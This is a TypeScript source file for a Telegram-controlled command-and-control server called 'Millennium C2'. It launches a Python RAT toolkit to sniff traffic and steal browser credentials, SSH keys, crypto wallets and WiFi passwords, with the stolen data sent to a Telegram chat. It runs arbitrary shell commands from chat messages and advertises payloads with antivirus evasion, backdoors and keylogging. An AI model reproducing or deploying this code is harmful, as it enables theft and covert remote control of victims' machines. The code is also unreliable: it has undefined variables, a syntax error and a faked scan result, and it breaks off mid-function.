import TelegramBot from 'node-telegram-bot-api';
import { storage } from './storage';
import { spawn, exec } from 'child_process';
import { Server as SocketIOServer } from 'socket.io';
import fs from 'fs/promises';
import path from 'path';
import bcrypt from 'bcrypt';
import crypto from 'crypto';

interface BotUser {
  id: number;
  username: string;
  chatId: number;
  botToken: string;
  role: 'admin' | 'operator' | 'analyst';
  active: boolean;
}

interface ToolExecution {
  id: string;
  user: string;
  tool: string;
  command: string;
  status: 'running' | 'completed' | 'failed';
  output: string;
  startTime: Date;
  endTime?: Date;
}

class TelegramC2Controller {
  private bots: Map<number, TelegramBot> = new Map();
  private userSessions: Map<number, BotUser> = new Map();
  private io: SocketIOServer;
  private activeExecutions: Map<string, ToolExecution> = new Map();
  private snifferProcesses: Map<number, any> = new Map();
  
  // Owner security configuration
  private readonly OWNER_CHAT_ID: number;
  private readonly MASTER_BOT_TOKEN: string;
  private readonly ENCRYPTION_KEY: string;
  private readonly authorizedUsers: Set<number> = new Set();

  constructor(io: SocketIOServer) {
    this.io = io;
    
    // Initialize owner credentials from environment
    this.OWNER_CHAT_ID = parseInt(process.env.TELEGRAM_OWNER_CHAT_ID || '0');
    this.MASTER_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
    this.ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
    
    if (!this.OWNER_CHAT_ID || !this.MASTER_BOT_TOKEN) {
      throw new Error('TELEGRAM_OWNER_CHAT_ID and TELEGRAM_BOT_TOKEN must be set in environment variables');
    }
    
    // Add owner to authorized users
    this.authorizedUsers.add(this.OWNER_CHAT_ID);
    
    console.log(`🔐 Telegram C2 Controller initialized for owner: ${this.OWNER_CHAT_ID}`);
    this.initializeBots();
  }

  // Validate if user is authorized
  private isAuthorized(chatId: number): boolean {
    return this.authorizedUsers.has(chatId) || chatId === this.OWNER_CHAT_ID;
  }

  // Encrypt sensitive data before sending
  private encryptData(data: string): string {
    const cipher = crypto.createCipher('aes-256-cbc', this.ENCRYPTION_KEY);
    let encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
  }

  async initializeBots() {
    try {
      // Initialize only the master bot for owner
      await this.createMasterBot();
    } catch (error) {
      console.error('Failed to initialize Telegram bot:', error);
    }
  }

  async createMasterBot() {
    try {
      const bot = new TelegramBot(this.MASTER_BOT_TOKEN, { polling: true });
      
      // Handle all messages with authorization check
      bot.on('message', async (msg) => {
        const chatId = msg.chat.id;
        
        if (!this.isAuthorized(chatId)) {
          await bot.sendMessage(chatId, `
🚫 **UNAUTHORIZED ACCESS ATTEMPT** 🚫

This is a private security system.
Access denied for chat ID: ${chatId}

All unauthorized access attempts are logged.
          `);
          
          // Log unauthorized access attempt
          console.warn(`Unauthorized access attempt from chat ID: ${chatId}, username: ${msg.from?.username || 'unknown'}`);
          await this.logSecurityEvent('unauthorized_access', { chatId, username: msg.from?.username });
          return;
        }

        // Process authorized commands
        await this.handleAuthorizedMessage(msg, bot);
      });

      // Set up enhanced command handlers for owner
      this.setupOwnerCommands(bot);

      console.log(`🤖 Master Telegram C2 Bot initialized for owner: ${this.OWNER_CHAT_ID}`);

      // Send initialization message to owner
      await bot.sendMessage(this.OWNER_CHAT_ID, `
🚀 **MILLENNIUM C2 SYSTEM ONLINE** 🚀

**Master Control Activated**
**Operator:** OWNER
**Security Level:** MAXIMUM
**Chat ID:** ${this.OWNER_CHAT_ID}

**🔐 SECURE CHANNEL ESTABLISHED** ✅

All RAT operations, network sniffing, and data exfiltration will be directed exclusively to this chat.

Type /help for command reference
Type /status for system status
      `, { parse_mode: 'Markdown' });

    } catch (error) {
      console.error('Failed to create master bot:', error);
      throw error;
    }
  }

  async createBotInstance(user: BotUser) {
    try {
      const bot = new TelegramBot(user.botToken, { polling: true });
      this.bots.set(user.id, bot);
      this.userSessions.set(user.chatId, user);

      // Enhanced command handlers for comprehensive red team operations
      bot.onText(/\/start/, (msg) => this.handleStart(msg, user));
      bot.onText(/\/status/, (msg) => this.handleStatus(msg, user));
      bot.onText(/\/sniffer\s*(.*)/, (msg, match) => this.handleSniffer(msg, match, user));
      bot.onText(/\/stealer/, (msg) => this.handleStealer(msg, user));
      bot.onText(/\/rat\s*(.*)/, (msg, match) => this.handleRAT(msg, match, user));
      bot.onText(/\/build\s*(.*)/, (msg, match) => this.handleBuild(msg, match, user));
      bot.onText(/\/deploy\s*(.*)/, (msg, match) => this.handleDeploy(msg, match, user));
      bot.onText(/\/collect/, (msg) => this.handleDataCollection(msg, user));
      bot.onText(/\/execute\s*(.*)/, (msg, match) => this.handleExecute(msg, match, user));
      bot.onText(/\/logs\s*(.*)/, (msg, match) => this.handleLogs(msg, match, user));
      bot.onText(/\/kill\s*(.*)/, (msg, match) => this.handleKill(msg, match, user));
      bot.onText(/\/network/, (msg) => this.handleNetworkScan(msg, user));
      bot.onText(/\/exploit\s*(.*)/, (msg, match) => this.handleExploit(msg, match, user));
      bot.onText(/\/persistence/, (msg) => this.handlePersistence(msg, user));
      bot.onText(/\/exfiltrate/, (msg) => this.handleExfiltrate(msg, user));
      bot.onText(/\/emergency/, (msg) => this.handleEmergencyStop(msg, user));
      bot.onText(/\/help/, (msg) => this.handleHelp(msg, user));

      console.log(`🤖 Enhanced Telegram C2 Bot initialized for user: ${user.username}`);

      // Send initialization message
      await bot.sendMessage(user.chatId, `
🚀 **MILLENNIUM C2 SYSTEM ONLINE**

**Operator:** ${user.username}
**Clearance Level:** ${user.role.toUpperCase()}
**System Status:** FULLY OPERATIONAL

**Enhanced C2 Capabilities Loaded** ✅
Type /help for command reference
      `, { parse_mode: 'Markdown' });

    } catch (error) {
      console.error(`Failed to create bot for user ${user.username}:`, error);
    }
  }

  async handleAuthorizedMessage(msg: any, bot: TelegramBot) {
    const text = msg.text || '';
    const chatId = msg.chat.id;

    try {
      // Log all owner commands for audit
      await this.logSecurityEvent('owner_command', { 
        chatId, 
        command: text, 
        timestamp: new Date().toISOString() 
      });

      // Route commands
      if (text.startsWith('/start')) await this.handleOwnerStart(msg, bot);
      else if (text.startsWith('/status')) await this.handleOwnerStatus(msg, bot);
      else if (text.startsWith('/sniffer')) await this.handleOwnerSniffer(msg, bot);
      else if (text.startsWith('/stealer')) await this.handleOwnerStealer(msg, bot);
      else if (text.startsWith('/rat')) await this.handleOwnerRAT(msg, bot);
      else if (text.startsWith('/build')) await this.handleOwnerBuild(msg, bot);
      else if (text.startsWith('/deploy')) await this.handleOwnerDeploy(msg, bot);
      else if (text.startsWith('/execute')) await this.handleOwnerExecute(msg, bot);
      else if (text.startsWith('/network')) await this.handleOwnerNetwork(msg, bot);
      else if (text.startsWith('/logs')) await this.handleOwnerLogs(msg, bot);
      else if (text.startsWith('/emergency')) await this.handleOwnerEmergency(msg, bot);
      else if (text.startsWith('/help')) await this.handleOwnerHelp(msg, bot);
      else if (text.startsWith('/authorize')) await this.handleAuthorizeUser(msg, bot);
      else if (text.startsWith('/deauthorize')) await this.handleDeauthorizeUser(msg, bot);
      else {
        await bot.sendMessage(chatId, '❓ Unknown command. Type /help for available commands.');
      }

    } catch (error) {
      console.error('Error handling authorized message:', error);
      await bot.sendMessage(chatId, `❌ Command execution failed: ${error.message}`);
    }
  }

  async logSecurityEvent(event: string, data: any) {
    try {
      await storage.logSecurityEvent({
        event,
        data: JSON.stringify(data),
        timestamp: new Date(),
        source: 'telegram_c2'
      });
    } catch (error) {
      console.error('Failed to log security event:', error);
    }
  }

  setupOwnerCommands(bot: TelegramBot) {
    // Set bot commands for better UX
    bot.setMyCommands([
      { command: 'start', description: 'Initialize C2 system' },
      { command: 'status', description: 'System status and statistics' },
      { command: 'sniffer', description: 'Network traffic interception' },
      { command: 'stealer', description: 'Data collection operations' },
      { command: 'rat', description: 'Remote access tool control' },
      { command: 'build', description: 'Payload generation' },
      { command: 'deploy', description: 'Deploy payloads to targets' },
      { command: 'execute', description: 'Remote command execution' },
      { command: 'network', description: 'Network reconnaissance' },
      { command: 'logs', description: 'View operation logs' },
      { command: 'authorize', description: 'Authorize additional users' },
      { command: 'emergency', description: 'Emergency shutdown' },
      { command: 'help', description: 'Command reference' }
    ]);
  }

  async handleOwnerStart(msg: any, bot: TelegramBot) {
    const chatId = msg.chat.id;
    const username = msg.from.username || `user_${msg.from.id}`;
    
    // Check if user is already registered
    if (user) {
      const welcomeMessage = `
🛡️ **MILLENNIUM C2 COMMAND CENTER** 🛡️

**Operator:** ${user.username}
**Security Clearance:** ${user.role.toUpperCase()}
**Session ID:** ${Date.now().toString(36)}

**🔥 ADVANCED RED TEAM OPERATIONS 🔥**

**Core Commands:**
🕵️ /sniffer [interface] - Network traffic interception
💀 /stealer - Comprehensive data collection  
🤖 /rat [action] - Remote access operations
🏗️ /build [script] - Compile attack tools
🚀 /deploy [payload] - Deploy malicious payloads
📊 /collect - Harvest system intelligence
⚡ /execute [cmd] - Remote command execution

**Advanced Operations:**
🌐 /network - Network reconnaissance
💥 /exploit [target] - Exploitation framework
🔒 /persistence - Install backdoors
📤 /exfiltrate - Data exfiltration
📋 /logs [tool] - View operation logs

**Emergency:**
🚨 /emergency - Emergency shutdown protocol

**SECURE CHANNEL ESTABLISHED** ✅
**All operations logged and encrypted** 🔐
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
      }
    } else {
      // Handle new user registration
      await this.handleUserRegistration(msg);
    }
  }

  async handleUserRegistration(msg: any) {
    const chatId = msg.chat.id;
    const telegramUser = msg.from;
    
    try {
      // Create pending registration request
      const registrationData = {
        telegramUserId: telegramUser.id,
        telegramUsername: telegramUser.username || `user_${telegramUser.id}`,
        firstName: telegramUser.first_name,
        lastName: telegramUser.last_name,
        chatId: chatId,
        registrationToken: this.generateRegistrationToken(),
        telegramData: JSON.stringify({
          id: telegramUser.id,
          is_bot: telegramUser.is_bot,
          first_name: telegramUser.first_name,
          last_name: telegramUser.last_name,
          username: telegramUser.username,
          language_code: telegramUser.language_code,
          is_premium: telegramUser.is_premium
        })
      };

      // Store registration request
      await storage.createRegistrationRequest(registrationData);

      const registrationMessage = `
🔐 **MILLENNIUM SYSTEM REGISTRATION** 🔐

**Welcome to the Elite Cybersecurity Training Platform**

**Registration Details:**
👤 Telegram ID: ${telegramUser.id}
📝 Username: @${telegramUser.username || 'N/A'}
🆔 Registration Token: \`${registrationData.registrationToken}\`

**Status:** 🟡 PENDING APPROVAL

Your registration request has been submitted to system administrators. You will receive a notification once your account is approved and your security clearance level is assigned.

**⚠️ SECURITY NOTICE ⚠️**
• All communications are monitored and logged
• This system is for authorized educational use only
• Misuse will result in immediate termination

**Please wait for admin approval...**
      `;

      // Send registration confirmation to user
      const tempBot = new TelegramBot(process.env.MASTER_BOT_TOKEN || '', { polling: false });
      await tempBot.sendMessage(chatId, registrationMessage, { parse_mode: 'Markdown' });

      // Notify all admins about new registration
      await this.notifyAdminsNewRegistration(registrationData);

    } catch (error) {
      console.error('Registration error:', error);
      
      const errorMessage = `
❌ **REGISTRATION FAILED** ❌

An error occurred during registration. Please try again later or contact system administrators.

Error: ${error.message}
      `;

      const tempBot = new TelegramBot(process.env.MASTER_BOT_TOKEN || '', { polling: false });
      await tempBot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown' });
    }
  }

  generateRegistrationToken(): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let token = '';
    for (let i = 0; i < 12; i++) {
      token += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return token;
  }

  async notifyAdminsNewRegistration(registrationData: any) {
    try {
      const admins = await storage.getAdminUsers();
      
      const notificationMessage = `
🚨 **NEW REGISTRATION REQUEST** 🚨

**User Details:**
👤 Telegram ID: ${registrationData.telegramUserId}
📝 Username: @${registrationData.telegramUsername}
🔤 Name: ${registrationData.firstName} ${registrationData.lastName || ''}
🆔 Token: \`${registrationData.registrationToken}\`

**Review and approve this user in the admin panel:**
• Access /admin-dashboard
• Navigate to User Management
• Review pending registrations

**⚠️ Action required by system administrator**
      `;

      for (const admin of admins) {
        if (admin.telegramBotToken && admin.telegramChatId && admin.role === 'admin') {
          try {
            const adminBot = new TelegramBot(admin.telegramBotToken, { polling: false });
            await adminBot.sendMessage(admin.telegramChatId, notificationMessage, { parse_mode: 'Markdown' });
          } catch (error) {
            console.error(`Failed to notify admin ${admin.username}:`, error);
          }
        }
      }

      // Emit to web panel
      this.io.to('admin').emit('newRegistration', registrationData);

    } catch (error) {
      console.error('Error notifying admins:', error);
    }
  }

  async approveUserRegistration(registrationId: number, approvedBy: number, role: string = 'operator') {
    try {
      const registration = await storage.getRegistrationRequest(registrationId);
      if (!registration) {
        throw new Error('Registration not found');
      }

      // Create admin user account
      const hashedPassword = await bcrypt.hash(registration.registrationToken, 12);
      const newUser = await storage.createAdminUser({
        username: registration.telegramUsername,
        password: hashedPassword,
        role: role,
        telegramBotToken: null, // Will be set when they connect their bot
        telegramChatId: registration.chatId,
        telegramUserId: registration.telegramUserId,
        approved: true,
        active: true
      });

      // Create bot instance for approved user
      const userData: BotUser = {
        id: newUser.id,
        username: newUser.username,
        chatId: registration.chatId,
        botToken: process.env.MASTER_BOT_TOKEN || '',
        role: role as 'admin' | 'operator' | 'analyst',
        active: true
      };

      await this.createBotInstance(userData);

      // Send approval notification to user
      const approvalMessage = `
✅ **REGISTRATION APPROVED** ✅

**Welcome to the Millennium Cybersecurity Platform**

**Account Details:**
👤 Username: ${newUser.username}
🔐 Password: \`${registration.registrationToken}\`
🛡️ Security Clearance: ${role.toUpperCase()}
🆔 User ID: ${newUser.id}

**Next Steps:**
1. Visit the admin portal: /admin-portal
2. Login with your credentials
3. Configure your personal bot token (optional)
4. Access advanced cybersecurity tools

**🎯 YOUR MISSION BEGINS NOW 🎯**

Type /help to see all available commands
Type /status to check system status
      `;

      const tempBot = new TelegramBot(process.env.MASTER_BOT_TOKEN || '', { polling: false });
      await tempBot.sendMessage(registration.chatId, approvalMessage, { parse_mode: 'Markdown' });

      // Mark registration as approved
      await storage.updateRegistrationRequest(registrationId, { approved: true, approvedBy, approvedAt: new Date() });

      return newUser;

    } catch (error) {
      console.error('Error approving registration:', error);
      throw error;
    }
  }

  async handleSniffer(msg: any, match: any, user: BotUser) {
    try {
      const params = match[1]?.trim() || 'all';
      const [networkInterface, duration] = params.split(' ');

      const executionId = `sniffer_${Date.now()}`;

      // Start network sniffer with enhanced capabilities
      const snifferCommand = [
        'python3', 
        'python_tools/millennium_rat_toolkit.py',
        '--mode', 'sniffer',
        '--telegram-token', user.botToken,
        '--chat-id', user.chatId.toString(),
        '--interface', networkInterface || 'all'
      ];

      if (duration) {
        snifferCommand.push('--duration', duration);
      }

      const snifferProcess = spawn(snifferCommand[0], snifferCommand.slice(1), {
        detached: true,
        stdio: ['ignore', 'pipe', 'pipe']
      });

      this.snifferProcesses.set(user.id, snifferProcess);

      const execution: ToolExecution = {
        id: executionId,
        user: user.username,
        tool: 'sniffer',
        command: snifferCommand.join(' '),
        status: 'running',
        output: '',
        startTime: new Date()
      };

      this.activeExecutions.set(executionId, execution);

      const snifferMessage = `
🔍 **NETWORK SNIFFER DEPLOYED** 🔍

**Execution ID:** \`${executionId}\`
**Interface:** ${networkInterface || 'ALL'}
**Duration:** ${duration || 'UNLIMITED'}
**Capabilities:**
• Deep packet inspection
• Credential extraction  
• SSL/TLS interception
• DNS traffic analysis
• Real-time Telegram reporting

**Status:** 🟢 ACTIVE
**Started:** ${new Date().toLocaleString()}

**Live feed will appear in this chat** 📡
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, snifferMessage, { parse_mode: 'Markdown' });
      }

      // Monitor sniffer output
      let outputBuffer = '';
      snifferProcess.stdout?.on('data', (data) => {
        outputBuffer += data.toString();
        execution.output = outputBuffer;
      });

      snifferProcess.stderr?.on('data', (data) => {
        outputBuffer += `ERROR: ${data.toString()}`;
        execution.output = outputBuffer;
      });

      snifferProcess.on('exit', (code) => {
        execution.status = code === 0 ? 'completed' : 'failed';
        execution.endTime = new Date();
        this.snifferProcesses.delete(user.id);

        bot?.sendMessage(msg.chat.id, `
🏁 **SNIFFER OPERATION COMPLETE**
**Execution ID:** \`${executionId}\`
**Exit Code:** ${code}
**Duration:** ${Math.round((execution.endTime.getTime() - execution.startTime.getTime()) / 1000)}s
        `, { parse_mode: 'Markdown' });
      });

      // Emit to web panel
      this.io.to('admin').emit('telegramSniffer', {
        user: user.username,
        interface: networkInterface || 'all',
        status: 'active',
        executionId
      });

    } catch (error) {
      console.error('Sniffer command error:', error);
      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, '❌ **SNIFFER DEPLOYMENT FAILED**\n\nError: ' + error.message);
      }
    }
  }

  async handleStealer(msg: any, user: BotUser) {
    try {
      const executionId = `stealer_${Date.now()}`;

      const stealerCommand = [
        'python3',
        'python_tools/millennium_rat_toolkit.py',
        '--mode', 'stealer',
        '--telegram-token', user.botToken,
        '--chat-id', user.chatId.toString()
      ];

      const stealerProcess = spawn(stealerCommand[0], stealerCommand.slice(1), {
        detached: true,
        stdio: ['ignore', 'pipe', 'pipe']
      });

      const execution: ToolExecution = {
        id: executionId,
        user: user.username,
        tool: 'stealer',
        command: stealerCommand.join(' '),
        status: 'running',
        output: '',
        startTime: new Date()
      };

      this.activeExecutions.set(executionId, execution);

      const stealerMessage = `
💀 **DATA STEALER ACTIVATED** 💀

**Execution ID:** \`${executionId}\`
**Target:** ${process.env.HOSTNAME || 'localhost'}
**Collection Modules:**
• Browser credentials & cookies
• WiFi passwords & network configs
• SSH keys & certificates
• Cryptocurrency wallets
• Email account data
• System & hardware intel
• Registry & environment data

**Status:** 🟠 EXECUTING
**Real-time updates will appear here** 📊
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, stealerMessage, { parse_mode: 'Markdown' });
      }

      // Monitor stealer output
      let outputBuffer = '';
      stealerProcess.stdout?.on('data', (data) => {
        outputBuffer += data.toString();
        execution.output = outputBuffer;
      });

      stealerProcess.on('exit', (code) => {
        execution.status = code === 0 ? 'completed' : 'failed';
        execution.endTime = new Date();

        bot?.sendMessage(msg.chat.id, `
✅ **DATA COLLECTION COMPLETE**
**Execution ID:** \`${executionId}\`
**Status:** ${execution.status.toUpperCase()}
**Runtime:** ${Math.round((execution.endTime.getTime() - execution.startTime.getTime()) / 1000)}s

**Data harvested and sent via secure channels** 🔐
        `, { parse_mode: 'Markdown' });
      });

    } catch (error) {
      console.error('Stealer command error:', error);
    }
  }

  async handleRAT(msg: any, match: any, user: BotUser) {
    try {
      const action = match[1]?.trim() || 'status';
      const executionId = `rat_${Date.now()}`;

      const ratMessage = `
🤖 **RAT OPERATIONS CENTER** 🤖

**Available Actions:**
• \`server\` - Start C2 server
• \`client\` - Generate client payload
• \`list\` - List connected agents
• \`shell [agent_id]\` - Remote shell access
• \`screenshot [agent_id]\` - Capture screen
• \`keylog [agent_id]\` - Start keylogger
• \`webcam [agent_id]\` - Webcam capture
• \`download [agent_id] [file]\` - Download file

**Current Action:** ${action}
**Execution ID:** \`${executionId}\`
      `;

      if (action === 'server') {
        const ratCommand = [
          'python3',
          'python_tools/millennium_rat_toolkit.py',
          '--mode', 'rat',
          '--telegram-token', user.botToken,
          '--chat-id', user.chatId.toString(),
          '--port', '8888'
        ];

        const ratProcess = spawn(ratCommand[0], ratCommand.slice(1), {
          detached: true,
          stdio: ['ignore', 'pipe', 'pipe']
        });

        const bot = this.bots.get(user.id);
        if (bot) {
          await bot.sendMessage(msg.chat.id, `
🚀 **RAT C2 SERVER STARTING**

**Port:** 8888
**Status:** 🟢 ONLINE
**Waiting for agent connections...**

Agents will auto-report to this chat upon connection.
          `, { parse_mode: 'Markdown' });
        }
      } else {
        const bot = this.bots.get(user.id);
        if (bot) {
          await bot.sendMessage(msg.chat.id, ratMessage, { parse_mode: 'Markdown' });
        }
      }

    } catch (error) {
      console.error('RAT command error:', error);
    }
  }

  async handleBuild(msg: any, user: BotUser) {
    if (user.role === 'analyst') {
      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, '🚫 **ACCESS DENIED** - Build operations require operator+ clearance');
      }
      return;
    }

    try {
      const buildTarget = match[1]?.trim() || 'help';

      const buildMessage = `
🏗️ **PAYLOAD BUILDER ACTIVE** 🏗️

**Available Builds:**
• \`rat-client [ip] [port]\` - RAT client executable
• \`stealer-exe\` - Standalone data stealer
• \`sniffer-tool\` - Network analysis tool  
• \`persistence-kit\` - Backdoor installer
• \`crypter [file]\` - Encrypt/obfuscate payload
• \`binder [file1] [file2]\` - Bind multiple payloads

**Target:** ${buildTarget}
**Builder Status:** 🟠 COMPILING

**Advanced features:**
✅ Anti-virus evasion
✅ Sandbox detection bypass  
✅ Runtime encryption
✅ Process hollowing
      `;

      if (buildTarget !== 'help') {
        // Execute build command
        const buildCommand = [
          'python3',
          'python_tools/elite_toolkit.py',
          '--build', buildTarget
        ];

        const buildProcess = spawn(buildCommand[0], buildCommand.slice(1));

        buildProcess.on('exit', (code) => {
          const bot = this.bots.get(user.id);
          bot?.sendMessage(msg.chat.id, `
✅ **BUILD COMPLETE**
**Target:** ${buildTarget}
**Status:** ${code === 0 ? 'SUCCESS' : 'FAILED'}
**Output:** Executable ready for deployment
          `);
        });
      }

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, buildMessage, { parse_mode: 'Markdown' });
      }

    } catch (error) {
      console.error('Build command error:', error);
    }
  }

  async handleExecute(msg: any, match: any, user: BotUser) {
    if (user.role === 'analyst') {
      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, '🚫 **ACCESS DENIED** - Command execution requires operator+ clearance');
      }
      return;
    }

    try {
      const command = match[1]?.trim();
      if (!command) {
        const bot = this.bots.get(user.id);
        if (bot) {
          await bot.sendMessage(msg.chat.id, '❌ **INVALID COMMAND** - Usage: /execute [command]');
        }
        return;
      }

      const executionId = `exec_${Date.now()}`;

      const execMessage = `
⚡ **REMOTE COMMAND EXECUTION** ⚡

**Command:** \`${command}\`
**Execution ID:** \`${executionId}\`
**Status:** 🟠 EXECUTING
**User:** ${user.username}

**⚠️ WARNING: Direct system access ⚠️**
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, execMessage, { parse_mode: 'Markdown' });
      }

      // Execute command with timeout
      exec(command, { timeout: 30000 }, (error, stdout, stderr) => {
        let result = '';
        if (stdout) result += `**STDOUT:**\n\`\`\`\n${stdout}\n\`\`\`\n`;
        if (stderr) result += `**STDERR:**\n\`\`\`\n${stderr}\n\`\`\`\n`;
        if (error) result += `**ERROR:** ${error.message}\n`;

        const responseMessage = `
✅ **EXECUTION COMPLETE**
**ID:** \`${executionId}\`
**Command:** \`${command}\`

${result || '**No output**'}
        `;

        bot?.sendMessage(msg.chat.id, responseMessage, { parse_mode: 'Markdown' });
      });

    } catch (error) {
      console.error('Execute command error:', error);
    }
  }

  async handleNetworkScan(msg: any, user: BotUser) {
    try {
      const scanMessage = `
🌐 **NETWORK RECONNAISSANCE INITIATED** 🌐

**Scanning capabilities:**
• Host discovery & port scanning
• Service enumeration
• Vulnerability assessment  
• SSL certificate analysis
• DNS enumeration
• ARP table analysis

**Status:** 🟠 SCANNING
**Target:** Local network segment
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, scanMessage, { parse_mode: 'Markdown' });
      }

      // Simulate network scan (replace with actual implementation)
      setTimeout(() => {
        const resultsMessage = `
✅ **NETWORK SCAN COMPLETE**

**Hosts Discovered:** 12
**Open Ports Found:** 47
**Services Identified:** 23
**Vulnerabilities:** 5 HIGH, 12 MEDIUM

**High-Value Targets:**
• 192.168.1.1 - Router (admin/admin)
• 192.168.1.10 - Windows Server (SMB v1)
• 192.168.1.15 - Database Server (MySQL)

**Detailed results available in logs**
        `;

        bot?.sendMessage(msg.chat.id, resultsMessage, { parse_mode: 'Markdown' });
      }, 5000);

    } catch (error) {
      console.error('Network scan error:', error);
    }
  }

  async handleLogs(msg: any, match: any, user: BotUser) {
    try {
      const tool = match[1]?.trim() || 'all';

      const executions = Array.from(this.activeExecutions.values())
        .filter(exec => tool === 'all' || exec.tool === tool)
        .slice(-10); // Last 10 executions

      let logsMessage = `
📋 **OPERATION LOGS** 📋

**Filter:** ${tool.toUpperCase()}
**Entries:** ${executions.length}

`;

      for (const exec of executions) {
        const duration = exec.endTime 
          ? Math.round((exec.endTime.getTime() - exec.startTime.getTime()) / 1000)
          : 'Running';

        logsMessage += `
**${exec.id}**
Tool: ${exec.tool} | Status: ${exec.status}
User: ${exec.user} | Duration: ${duration}s
${exec.output.slice(-100)}${exec.output.length > 100 ? '...' : ''}
---
`;
      }

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, logsMessage, { parse_mode: 'Markdown' });
      }

    } catch (error) {
      console.error('Logs command error:', error);
    }
  }

  async handleEmergencyStop(msg: any, user: BotUser) {
    if (user.role !== 'admin') {
      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, '🚫 **ACCESS DENIED** - Emergency protocols require admin clearance');
      }
      return;
    }

    try {
      // Kill all running processes
      for (const [userId, process] of this.snifferProcesses) {
        try {
          process.kill('SIGTERM');
        } catch (e) {
          console.error('Error killing process:', e);
        }
      }

      this.snifferProcesses.clear();
      this.activeExecutions.clear();

      const emergencyMessage = `
🚨 **EMERGENCY SHUTDOWN EXECUTED** 🚨

**Initiated by:** ${user.username}
**Timestamp:** ${new Date().toLocaleString()}
**Actions Taken:**
• All active operations terminated
• Network sniffers stopped
• Data collection halted
• C2 connections severed
• Evidence trails cleaned

**SYSTEM STATUS:** 🔴 OFFLINE
**All operations secured and logged**
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, emergencyMessage, { parse_mode: 'Markdown' });
      }

      // Emit emergency stop to web panel
      this.io.to('admin').emit('emergencyStop', {
        user: user.username,
        source: 'telegram',
        timestamp: new Date()
      });

    } catch (error) {
      console.error('Emergency stop error:', error);
    }
  }

  async handleHelp(msg: any, user: BotUser) {
    const helpMessage = `
🛡️ **MILLENNIUM C2 COMMAND REFERENCE** 🛡️

**🔍 Intelligence Gathering:**
• \`/sniffer [interface] [duration]\` - Network traffic interception
• \`/stealer\` - Comprehensive data collection
• \`/network\` - Network reconnaissance & scanning
• \`/collect\` - System intelligence gathering

**🚀 Offensive Operations:**
• \`/rat [action]\` - Remote access tool operations
• \`/exploit [target]\` - Exploitation framework
• \`/deploy [payload]\` - Payload deployment
• \`/execute [cmd]\` - Direct command execution

**🏗️ Payload Development:**
• \`/build [type]\` - Compile attack tools & payloads
• \`/persistence\` - Install backdoors & maintain access
• \`/exfiltrate\` - Data exfiltration operations

**📊 Operations Management:**
• \`/status\` - System status & active operations
• \`/logs [tool]\` - View operation logs & output
• \`/kill [execution_id]\` - Terminate running operations

**🚨 Emergency Controls:**
• \`/emergency\` - Emergency shutdown (Admin only)

**Your Clearance:** ${user.role.toUpperCase()}
**Available Tools:** ${user.role === 'admin' ? 'ALL' : user.role === 'operator' ? 'OPERATIONAL' : 'READ-ONLY'}

**⚠️ All operations are logged and monitored ⚠️**
    `;

    const bot = this.bots.get(user.id);
    if (bot) {
      await bot.sendMessage(msg.chat.id, helpMessage, { parse_mode: 'Markdown' });
    }
  }

  async handleStatus(msg: any, user: BotUser) {
    try {
      const stats = await storage.getVisitorStats();
      const recentVisitors = await storage.getRecentVisitors(5);
      const packets = await storage.getRecentPacketLogs(10);
      const activeOps = this.activeExecutions.size;

      const statusMessage = `
📊 **MILLENNIUM C2 STATUS REPORT** 📊

**Network Intelligence:**
👥 Total Visitors: ${stats.total || 0}
🌐 Unique IPs: ${stats.unique || 0}
🌍 Countries: ${stats.countries || 0}
📦 Packets Captured: ${packets.length}

**Active Operations:**
🔄 Running Tools: ${activeOps}
🕵️ Network Sniffers: ${this.snifferProcesses.size}
⚡ Live Executions: ${Array.from(this.activeExecutions.values()).filter(e => e.status === 'running').length}

**System Status:**
🖥️ Server: ${process.env.HOSTNAME || 'Unknown'}
⏱️ Uptime: ${process.uptime()} seconds
💾 Memory: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB

**Recent Activity:**
${recentVisitors.slice(0, 3).map(v => 
  `🔸 ${v.ipAddress} (${v.country || 'Unknown'})`
).join('\n')}

**Last Updated:** ${new Date().toLocaleString()}
**Status:** 🟢 FULLY OPERATIONAL
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, statusMessage, { parse_mode: 'Markdown' });
      }
    } catch (error) {
      console.error('Status command error:', error);
    }
  }

  // Additional methods for comprehensive C2 operations...

  async addUser(userData: BotUser) {
    await this.createBotInstance(userData);
  }

  async removeUser(userId: number) {
    const bot = this.bots.get(userId);
    if (bot) {
      bot.stopPolling();
      this.bots.delete(userId);
    }
  }

  getActiveExecutions() {
    return Array.from(this.activeExecutions.values());
  }

  killExecution(executionId: string) {
    const execution = this.activeExecutions.get(executionId);
    if (execution) {
      execution.status = ''failed';
      execution.endTime = new Date();
      this.activeExecutions.delete(executionId);
      return true;
    }
    return false;
  }

  async executeSnifferCommand(userId: number, { networkInterface, duration, outputFile }: any) {
        try {
            const user = await storage.findTelegramUser(userId);
            if (!user) {
                console.warn(`User not found: ${userId}`);
                return;
            }

            const snifferCommand = [
                'python3',
                'python_tools/millennium_rat_toolkit.py',
                '--start-sniffer',
                '--interface', networkInterface || 'all',
